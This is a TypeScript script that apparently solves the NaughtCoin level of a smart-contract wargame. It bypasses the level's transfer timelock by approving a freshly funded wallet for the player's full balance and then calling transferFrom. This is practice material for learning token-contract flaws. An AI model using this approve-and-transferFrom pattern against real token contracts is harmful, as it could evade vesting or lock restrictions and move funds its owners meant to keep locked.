import { IERC20 } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const NAUGHT_COIN_LEVEL_NAME = "NaughtCoin"

export const naughtCoinAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            const coin = await ethereum.getContract<IERC20>('IERC20', instanceAddress);

            const someOtherWallet = ethereum.createRandomWallet();

            const transferTx = await ethereum.sendRawTx({ value: ethereum.parseEther('0.1'), to: someOtherWallet.address });
            await transferTx.wait();

            console.log('Approving other wallet: ', someOtherWallet.address);
          
            const player = await ethereum.getPlayerAddress();
            const balance = await coin.balanceOf(player);
            const tx = await coin.approve(someOtherWallet.address, balance);
            await tx.wait();

            const otherWalletCoin = coin.connect(someOtherWallet);

            console.log('Transfering tokens.');
            const tx2 = await otherWalletCoin.transferFrom(player, someOtherWallet.address, balance);
            await tx2.wait();
        }
    }
}